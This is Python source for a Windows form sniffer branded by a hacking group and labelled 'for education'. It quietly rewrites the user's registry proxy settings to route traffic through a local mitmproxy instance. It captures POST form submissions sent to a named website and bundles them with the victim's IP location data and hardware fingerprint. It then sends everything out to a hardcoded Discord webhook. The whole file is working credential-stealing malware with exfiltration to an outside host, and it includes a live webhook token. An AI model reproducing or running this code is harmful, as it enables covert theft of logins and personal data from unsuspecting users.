import asyncio, requests, json, winreg, platform, psutil, GPUtil, cpuinfo, uuid, wmi
from mitmproxy import options, http
from mitmproxy.tools import dump
from rich.console import Console
from discord_webhook import DiscordWebhook, DiscordEmbed

console = Console(width=100)
console.print(f"[bold dark_orange]THT FORM SNIFFER (FOR EDUCATION)[/bold dark_orange]", no_wrap=True)

LISTEN_HOST = "127.0.0.1"
LISTEN_PORT = 1881
NET_DUMP_LOG = False
WEBHOOK_URL = "https://discord.com/api/webhooks/1262161347706355792/gcfFikUUJEj8Q-zkuIOf4D44eDd1isiOaWLMYnouf1WbMtKA38nyv3z4tSqCM88HX4y5"
SNIFFED_ADRESSES = ["https://midnight.im"]

def set_proxy_settings():
    try:
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                      r"Software\Microsoft\Windows\CurrentVersion\Internet Settings", 0,
                                      winreg.KEY_WRITE)
        winreg.SetValueEx(registry_key, "ProxyEnable", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(registry_key, "ProxyServer", 0, winreg.REG_SZ,
                          f"{LISTEN_HOST}:{str(LISTEN_PORT)}")
        winreg.FlushKey(registry_key)
        winreg.CloseKey(registry_key)
    except Exception as e:
        print("Proxy ayarlarını güncellemede bir hata oluştu:", e)

def disable_proxy_settings():
    try:
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                      r"Software\Microsoft\Windows\CurrentVersion\Internet Settings", 0,
                                      winreg.KEY_WRITE)
        winreg.SetValueEx(registry_key, "ProxyEnable", 0, winreg.REG_DWORD, 0)
        winreg.FlushKey(registry_key)
        winreg.CloseKey(registry_key)
    except Exception as e:
        print("Proxy ayarları kaldırılırken bir hata meydana geldi:", e)

def get_system_info():
    cpu_info = cpuinfo.get_cpu_info()
    c = wmi.WMI()

    bios_info = c.Win32_BIOS()[0]

    system_info = {
        "device_name": platform.node(),
        "os": platform.system(),
        "os_version": platform.version(),
        "platform": platform.platform(),
        "processor": cpu_info.get('brand_raw', 'Unknown'),
        "bios": {
            "manufacturer": bios_info.Manufacturer,
            "version": bios_info.Version,
            "release_date": bios_info.ReleaseDate
        },
        "hwid": str(uuid.UUID(int=uuid.getnode())),
        "gpus": []
    }

    gpus = GPUtil.getGPUs()
    for gpu in gpus:
        gpu_info = {
            "id": gpu.id,
            "name": gpu.name,
            "driver_version": gpu.driver,
        }
        system_info["gpus"].append(gpu_info)
    
    return system_info

set_proxy_settings()

class RequestLogger:
    async def request(self, flow: http.HTTPFlow):
        if str(flow.request.method) == "POST" and flow.request.headers.get("origin") in SNIFFED_ADRESSES:
            try:
                disable_proxy_settings()
                get_content_type = flow.request.headers.get("content-type")
                if "multipart" in get_content_type:
                    get_form = str(flow.request.content)
                    file_type = ".txt"
                else:
                    get_form = flow.request.urlencoded_form.copy()
                    normal_dict = {}
                    for key, value in get_form.items():
                        if key in normal_dict:
                            if isinstance(normal_dict[key], list):
                                normal_dict[key].append(value)
                            else:
                                normal_dict[key] = [normal_dict[key], value]
                        else:
                            normal_dict[key] = value
                    get_form = json.dumps(normal_dict, indent=4)
                    file_type = ".json"
                try:
                    get_ip_adress = requests.get("http://ip-api.com/json/", verify=False).json()
                    get_ip_adress = json.dumps(get_ip_adress, indent=4, ensure_ascii=False)
                except:
                    get_ip_adress = "Bulunamadı."
                system_info = get_system_info()
                system_info = json.dumps(system_info, indent=4)
                webhook = DiscordWebhook(url=WEBHOOK_URL)
                embed = DiscordEmbed(title="MITM PROXY", description="Yeni bir form verisi yakalandı.", color="03b2f8")
                embed.add_embed_field(name="İstek Yollanılan Adres", value=flow.request.url, inline=False)
                embed.add_embed_field(name="IP Bilgisi", value=f"```json\n{get_ip_adress}```", inline=False)
                embed.add_embed_field(name="Cihaz Bilgisi", value=f"```json\n{system_info}```", inline=False)
                embed.set_footer(text="THT FORM SNIFFER", icon_url="https://upload.wikimedia.org/wikipedia/commons/2/2e/T%C3%BCrkHackTeam_Logo.png")
                embed.set_timestamp()
                webhook.add_file(get_form, f"form{file_type}")
                webhook.add_embed(embed)
                try:
                    webhook.execute()
                except Exception as e:
                    print(e)
                set_proxy_settings()
            except Exception as e:
                console.print(e, no_wrap=True)


async def start_proxy(host, port):
    opts = options.Options(listen_host=host, listen_port=port)
    master = dump.DumpMaster(
        opts,
        with_termlog=NET_DUMP_LOG,
        with_dumper=NET_DUMP_LOG,
    )
    master.addons.add(RequestLogger())
    await master.run()
    return master

loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

async def create_tasks_func(host, port):
    tasks = []
    tasks.append(asyncio.create_task(start_proxy(host, port)))
    await asyncio.wait(tasks)

def main():
    try:
        loop.run_until_complete(create_tasks_func(LISTEN_HOST, LISTEN_PORT)) 
        loop.close()
    except Exception as e:
        print(e)

if __name__ == '__main__':
    main()
